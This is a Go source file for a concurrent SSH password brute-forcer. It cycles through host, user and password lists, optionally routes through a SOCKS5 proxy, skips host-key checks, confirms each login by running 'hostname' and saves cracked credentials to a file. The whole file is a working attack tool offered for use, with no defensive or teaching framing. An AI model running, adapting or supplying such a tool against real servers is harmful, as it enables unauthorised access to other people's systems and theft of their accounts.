package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	worker "github.com/namcuongq/worker"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

var (
	hostFile      = flag.String("H", "", "File containing target hostnames or IP addresses")
	userFile      = flag.String("U", "", "File containing usernames to brute force")
	passFile      = flag.String("P", "", "File containing usernames to brute force")
	host          = flag.String("h", "", "Target hostname or IP address")
	user          = flag.String("u", "", "User to brute force")
	password      = flag.String("p", "", "Password to brute force")
	port          = flag.Int("port", 22, "Port to brute force")
	concurrent    = flag.Int("c", 10, "Concurrency/threads level")
	sock5         = flag.String("sock5", "", "Sock5 proxy address")
	output        = flag.String("o", "success.txt", "Output file")
	timer         = flag.Duration("timer", 300*time.Millisecond, "Set timeout to ssh dial response")
	channelResult = make(chan string, 0)

	successList = make(map[string]bool, 0)
)

func sshConnect(ip, user, pass string) {
	if successList[fmt.Sprintf("%s@%s", user, ip)] {
		return
	}

	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		Timeout:         *timer,
	}

	var sshClient *ssh.Client
	if len(*sock5) > 0 {
		dialer, err := proxy.SOCKS5("tcp", *sock5, nil, proxy.Direct)
		if err != nil {
			log.Fatal(err)
		}

		conn, err := dialer.Dial("tcp", ip)
		if err != nil {
			log.Fatal(err)
		}

		c, chans, reqs, err := ssh.NewClientConn(conn, ip, config)
		if err != nil {
			fmt.Printf("%s [%s]: %s/%s ---\n", color.RedString("Failed"), ip, user, pass)
			return
		}
		sshClient = ssh.NewClient(c, chans, reqs)
		defer c.Close()

	} else {
		var err error
		sshClient, err = ssh.Dial("tcp", ip, config)
		if err != nil {
			fmt.Printf("%s [%s]: %s/%s ---\n", color.RedString("Failed"), ip, user, pass)
			return
		}
	}

	fmt.Printf("%s [%s]: %s/%s\n", color.BlueString("Success: "), color.GreenString(ip), color.GreenString(user), color.GreenString(pass))
	successList[fmt.Sprintf("%s@%s", user, ip)] = true

	session, err := sshClient.NewSession()
	defer session.Close()
	if err != nil {
		fmt.Printf("%s %s %v\n", color.RedString("\nCreate session error:"), ip, err)
		return
	}

	combo, err := session.CombinedOutput("hostname")
	if err != nil {
		fmt.Printf("%s %s\n", color.RedString("Command hostname error on: "), ip)
		return
	} else {
		hostname := strings.ReplaceAll(string(combo), "\n", "")
		channelResult <- fmt.Sprintf("[%s] %s %s/%s", hostname, ip, user, pass)
	}
}

func writeOutput(outputWriter *os.File) {
	for {
		select {
		case msg := <-channelResult:
			if msg == "0" {
				return
			}
			_, err := outputWriter.WriteString(fmt.Sprintf("%s\n", msg))
			if err != nil {
				panic(err)
			}
		}
	}
}

func printUsedValues() {
	if len(*hostFile) > 0 {
		fmt.Println("host file:", *hostFile)
	} else if len(*host) > 0 {
		fmt.Println("host:", *host)
	} else {
		fmt.Println("Host information must be supplied")
		os.Exit(1)
	}

	if len(*userFile) > 0 {
		fmt.Println("user file:", *userFile)
	} else if len(*user) > 0 {
		fmt.Println("user:", *user)
	} else {
		fmt.Println("User logon information must be supplied")
		os.Exit(1)
	}

	if len(*passFile) > 0 {
		fmt.Println("password file:", *passFile)
	} else if len(*password) > 0 {
		fmt.Println("password:", *password)
	} else {
		fmt.Println("Password information must be supplied")
		os.Exit(1)
	}

	fmt.Println("port:", *port)
	fmt.Println("timer:", timer)
	fmt.Println("additional args:", flag.Args())
}

func Task(data interface{}) {
	arr := data.([]string)
	sshConnect(arr[0], arr[1], arr[2])
}

func main() {
	userList := []string{}
	passwordList := []string{}
	hostList := []string{}

	if len(*userFile) > 0 {
		userList = fileToLines(*userFile)
	} else {
		userList = []string{*user}
	}

	if len(*passFile) > 0 {
		passwordList = fileToLines(*passFile)
	} else {
		passwordList = []string{*password}
	}

	if len(*hostFile) > 0 {
		hostList = fileToLines(*hostFile)
	} else {
		hostList = []string{*host}
	}

	outputWriter, err := os.Create(*output)
	if err != nil {
		log.Fatal(err)
	}

	go writeOutput(outputWriter)

	pool := worker.New(*concurrent, Task)
	for _, ip := range hostList {
		sshServerAddress := ip + ":" + strconv.Itoa(*port)
		for _, u := range userList {
			for _, p := range passwordList {
				pool.Add([]string{sshServerAddress, u, p})
			}
		}
	}

	pool.WaitAndClose()
	channelResult <- "0"
	close(channelResult)
}

func fileToLines(path string) (arr []string) {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		arr = append(arr, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	flag.Parse()
	printUsedValues()
}
